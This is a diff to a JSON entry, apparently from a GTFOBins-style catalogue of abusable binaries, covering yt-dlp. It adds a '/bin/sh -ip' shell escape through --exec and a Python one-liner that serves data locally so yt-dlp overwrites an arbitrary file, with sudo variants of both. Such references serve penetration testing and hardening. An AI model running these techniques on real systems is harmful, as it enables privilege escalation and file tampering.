@@ -1,22 +1,25 @@
 {
   "comment": "yt-dlp can execute a command via the --exec option. yt-dlp appends the downloaded filepath as an extra argument.",
   "functions": {
-    "command": [
+    "shell": [
       {
-        "code": "yt-dlp 'video url' --exec '/path/to/command #'\n",
+        "comment": "Spawn an interactive shell. The trailing '#' comments out the appended filepath argument.",
+        "code": "yt-dlp 'video url' --exec '/bin/sh -ip #'",
         "contexts": {
           "unprivileged": {},
           "sudo": {}
         }
       }
     ],
-    "shell": [
+    "file-write": [
       {
-        "comment": "The executed command may receive the downloaded filepath as an extra trailing argument, commenting it out prevents it from breaking the command.",
-        "code": "yt-dlp 'video url' --exec '/bin/sh -ip #'\n",
+        "comment": "Start a local HTTP server serving DATA, then use yt-dlp to write/overwrite a file at an arbitrary path (no internet required).",
+        "code": "python3 -c 'import threading,http.server,socketserver,subprocess;p=b\"DATA\";H=type(\"H\",(http.server.BaseHTTPRequestHandler,),{\"do_GET\":lambda s:(s.send_response(200),s.send_header(\"Content-Type\",\"video/mp4\"),s.send_header(\"Content-Length\",str(len(p))),s.end_headers(),s.wfile.write(p)),\"log_message\":lambda s,*a:None});socketserver.TCPServer.allow_reuse_address=True;s=socketserver.TCPServer((\"\",8000),H);threading.Thread(target=s.serve_forever,daemon=True).start();subprocess.run([\"yt-dlp\",\"--force-generic-extractor\",\"--force-overwrites\",\"-o\",\"/path/to/output-file\",\"http://localhost:8000/fake-video.mp4\"]);s.shutdown()'",
         "contexts": {
           "unprivileged": {},
-          "sudo": {}
+          "sudo": {
+            "code": "python3 -c 'import threading,http.server,socketserver,subprocess;p=b\"DATA\";H=type(\"H\",(http.server.BaseHTTPRequestHandler,),{\"do_GET\":lambda s:(s.send_response(200),s.send_header(\"Content-Type\",\"video/mp4\"),s.send_header(\"Content-Length\",str(len(p))),s.end_headers(),s.wfile.write(p)),\"log_message\":lambda s,*a:None});socketserver.TCPServer.allow_reuse_address=True;s=socketserver.TCPServer((\"\",8000),H);threading.Thread(target=s.serve_forever,daemon=True).start();subprocess.run([\"sudo\",\"yt-dlp\",\"--force-generic-extractor\",\"--force-overwrites\",\"-o\",\"/path/to/output-file\",\"http://localhost:8000/fake-video.mp4\"]);s.shutdown()'"
+          }
         }
       }
     ]
